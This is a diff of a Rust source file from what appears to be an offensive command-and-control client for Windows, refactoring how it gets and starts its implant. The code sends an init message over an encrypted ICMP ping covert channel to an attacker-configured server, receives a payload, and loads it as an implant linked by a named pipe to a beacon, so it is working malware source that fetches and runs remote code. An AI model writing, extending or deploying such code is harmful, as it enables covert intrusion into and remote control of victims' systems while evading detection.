@@ -17,14 +17,38 @@ use windows::{
 fn main() {
     let addr = Ipv4Addr::from_str(env!(
         "SERVER_IP",
-        "Set the upstream ip env (SERVER_IP) in dotted decimal"
+        "Set the upstream ip env (SERVER_IP) in dotted decimal, or hostname"
     ))
     .unwrap()
     .octets();
     let id: u16 = random();
-    let mut chan: CovertChannel<PingMessage, 4> = CovertChannel::new(key_from_string(env!("KEY")));
+    let mut chan: CovertChannel<PingMessage, 4> = CovertChannel::new(key_from_string(env!("KEY","The common encryption key")));
     let implant = get_implant(&mut chan, id, addr);
     start_loop(&mut chan, id, addr, implant);
+}
+
+fn get_implant(chan: &mut CovertChannel<PingMessage, 4>, id: u16, addr: [u8; 4]) -> Implant {
+    let arch = if cfg!(target_arch = "x86_64") {
+        Arch::X86_64
+    } else {
+        Arch::i686
+    };
+    chan.put_message(
+        PingMessage::InitMessage(arch, env!("PIPE_NAME","The pipe name to connect to the beacon").to_owned()),
+        id,
+    );
+    match get_ping_message(
+        chan,
+        id,
+        Duration::from_secs(env!("SLEEP", "Initial sleep timer").parse().unwrap()),
+        addr,
+    ) {
+        PingMessage::DataMessage(data) => {
+            return covert_client::create_implant_from_buf(data, env!("PIPE_NAME","The pipe name to connect to the beacon")).unwrap();
+            //Failed to create implant
+        }
+        _ => panic!(""), //Bad First Message
+    };
 }
 
 fn start_loop(
@@ -50,29 +74,7 @@ fn start_loop(
     }
 }
 
-fn get_implant(chan: &mut CovertChannel<PingMessage, 4>, id: u16, addr: [u8; 4]) -> Implant {
-    let arch = if cfg!(target_arch = "x86_64") {
-        Arch::X86_64
-    } else {
-        Arch::i686
-    };
-    chan.put_message(
-        PingMessage::InitMessage(arch, env!("PIPE_NAME").to_owned()),
-        id,
-    );
-    match get_ping_message(
-        chan,
-        id,
-        Duration::from_secs(env!("SLEEP", "Initial sleep timer").parse().unwrap()),
-        addr,
-    ) {
-        PingMessage::DataMessage(data) => {
-            return covert_client::create_implant_from_buf(data, env!("PIPE_NAME")).unwrap();
-            //Failed to create implant
-        }
-        _ => panic!(""), //Bad First Message
-    };
-}
+
 
 fn get_ping_message(
     chan: &mut CovertChannel<PingMessage, 4>,
